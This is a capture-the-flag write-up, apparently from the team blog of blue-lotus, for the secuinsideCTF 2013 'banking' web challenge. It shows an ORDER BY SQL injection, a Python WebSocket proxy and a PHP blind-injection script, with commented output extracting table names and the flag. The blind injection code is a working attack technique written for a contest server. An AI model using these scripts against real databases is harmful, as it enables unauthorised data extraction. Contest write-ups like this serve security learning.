
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>secuinsideCTF 2013 web banking writeup - blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="banking We found a SQL injection vulnerability in the list page. When we use the funtion listing('balance', 'desc'), we will get the list of users &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net//secuinsidectf-2013-web-banking-writeup">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <div id="header-inner">
    <span class="first"><a href="/">blue-lotus</a></span>
    <span><a href="/about">about</a></span>
    <span class="last"><a href="/atom.xml" title="subscribe via RSS">rss</a></span>
  </div>
</hgroup>

</header>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">secuinsideCTF 2013 Web Banking Writeup</h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-05-28T00:00:00+08:00" pubdate data-updated="true">May 28<span>th</span>, 2013</time>
        
      </p>
    
  </header>


<div class="entry-content"><h2>banking</h2>

<p>We found a SQL injection vulnerability in the list page.</p>

<p>When we use the funtion <code>listing('balance', 'desc')</code>, we will get the list of users ordered by <code>balance</code>.</p>

<p>The sql query seems to be</p>

<pre><code>select user,balance from user_accounts order by $o $b;
</code></pre>

<p>$o and $b is the two parameters of function listing();</p>

<p>$o is filtered, but $b is injectable.</p>

<p>For eaxmple, <code>listing('balance', 'limit 0,1')</code>; returns only one result.</p>

<p>The following queries returns different result.</p>

<pre><code>select user,balance from user_accounts order by user, If(2&amp;gt;1, 1, select table_name from information_schema.tables)
select user,balance from user_accounts order by user, If(2&amp;lt;1, 1, select table_name from information_schema.tables)
</code></pre>

<p>We wrote a python script to switch protocols from HTTP to WebSocket. (by Flanker)</p>

<pre><code>from SimpleHTTPServer import SimpleHTTPRequestHandler
from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer
from urlparse import urlparse, parse_qs
import SocketServer
from websocket import create_connection
import json

class MyHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        enc = &amp;#039;utf-8&amp;#039;
        self.send_response(200)
        self.send_header(&amp;quot;Content-type&amp;quot;, &amp;quot;text/html;charset%s&amp;quot; % enc)
        self.end_headers()
        url = self.path
        d = parse_qs(urlparse(url).query)
        print d
        cmd = &amp;quot;list_init&amp;quot;
        if &amp;quot;cmd&amp;quot; in d:
            cmd = d[&amp;quot;cmd&amp;quot;][0]
        o = None
        if &amp;quot;o&amp;quot; in d:
            o = d[&amp;quot;o&amp;quot;][0]
        b = None
        if &amp;quot;b&amp;quot; in d:
            b = d[&amp;quot;b&amp;quot;][0]
        print o, b
        if o is not None and b is not None:
            result = json.loads(self.ws_fetch(cmd, o, b))
            users = json.loads(result[&amp;quot;m&amp;quot;])
            self.wfile.write(len(users))
##            for user in users:
##                self.wfile.write(&amp;quot;&lt;tr&gt;\n")
##                self.wfile.write(("&lt;th&gt;%s&lt;/th&gt;\n" % user["user"]).encode("utf-8"))
##                self.wfile.write(("&lt;th&gt;%s&lt;/th&gt;\n" % user["balance"]).encode("utf-8"))
##                self.wfile.write("&lt;/tr&gt;")

##            self.wfile.write("&lt;/table&gt;")

    def ws_fetch(self, cmd, o, b):
        s = json.dumps({"cmd": cmd, "o": o,"b":b})
        print s
        fetched = False
        while not fetched:
            try:
                ws = create_connection("ws://1.234.27.139:38090/banking")
                ws.send(s)
                ret = ws.recv()
                fetched = True
                return ret
            except Exception as e:
                print "err"
                print e
        return None

    def do_POST(self):
        pass

    def do_HEAD(self):
        pass


if __name__ == '__main__':
    port = 8080

    handler = SimpleHTTPRequestHandler

    # httpd = SocketServer.TCPServer(("", port ), handler )
    httpd = HTTPServer(('', port), MyHTTPRequestHandler)

    print "Server is running at port", port
    httpd.serve_forever()
</code></pre>

<p>Later we wrote a php script to do blind injection.</p>

<pre><code>&amp;lt;?php
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);

    function check($url)
    {
        global $ch;
        curl_setopt($ch, CURLOPT_URL, $url);
        echo &amp;quot;$url\n&amp;quot;;
        $res = curl_exec($ch);
        echo &amp;quot;$res\n&amp;quot;;
        return $res;
    }

    function guess($column, $clause = &amp;quot;from information_schema.tables limit 0,1&amp;quot;, $length = 3)
    {
        $ret = &amp;quot;&amp;quot;;
        $clause = urlencode($clause);
        for ($i = 1; $i 1;
                $url = "http://127.0.0.1:8080/?o=user&amp;amp;b=,If((select%20ascii(substring($column,$i,1))%20$clause)&amp;gt;=$mid,1,(select%20table_name%20from%20information_schema.tables))%20limit%200,1";
                if (check($url)) $l = $mid+1;
                else $r = $mid - 1;
                echo "$l, $r\n";
            }
            $ret .= chr($r);
            echo "$ret\n";
        }
        return $ret;
    }

    //echo guess("length(version())");
    //echo guess("version()", 23);
    //echo guess("length(table_name)", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 0,1");  // 13
    //echo guess("table_name", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 0,1", 13);  //user_accounts
    //echo guess("length(table_name)", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 1,1");  // 8
    //echo guess("table_name", "from information_schema.tables where table_schema!=0x696e666f726d6174696f6e5f736368656d61 limit 1,1", 8);   // flag_tbl
    //echo guess("length(table_schema)", "from information_schema.tables where table_name=0x666c61675f74626c limit 0,1");   // 7
    //echo guess("table_schema", "from information_schema.tables where table_name=0x666c61675f74626c limit 0,1", 7);    // flag_db
    //echo guess("length(column_name)", "from information_schema.columns where table_name=0x666c61675f74626c limit 0,1");   // 4 flag
    //echo guess("length(flag)", "from flag_db.flag_tbl limit 0,1");    // 21
    //echo guess("flag", "from flag_db.flag_tbl limit 0,1", 21);    // TheG0d0fGrabs_M4dL1F3
?&amp;gt;
</code></pre>

<p>The Flag is <code>TheG0d0fGrabs_M4dL1F3</code> .</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">slipper</span></span>

      








  


<time datetime="2013-05-28T00:00:00+08:00" pubdate data-updated="true">May 28<span>th</span>, 2013</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/uncategorized/'>Uncategorized</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/secuinside-ctf-web-the-bank-robber-writeup/" title="Previous Post: secuinside ctf web The Bank Robber writeup">&laquo; secuinside ctf web The Bank Robber writeup</a>
      
      
        <a class="basic-alignment right" href="/secuinside-ctf-quals-2013-pe_time-writeup/" title="Next Post: secuinside CTF Quals 2013 PE_Time writeup">secuinside CTF Quals 2013 PE_Time writeup &raquo;</a>
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
      </li>
    
      <li class="post">
        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
      </li>
    
      <li class="post">
        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
      </li>
    
      <li class="post">
        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2013 - blue-lotus -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'bluelotus';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>











</body>
</html>
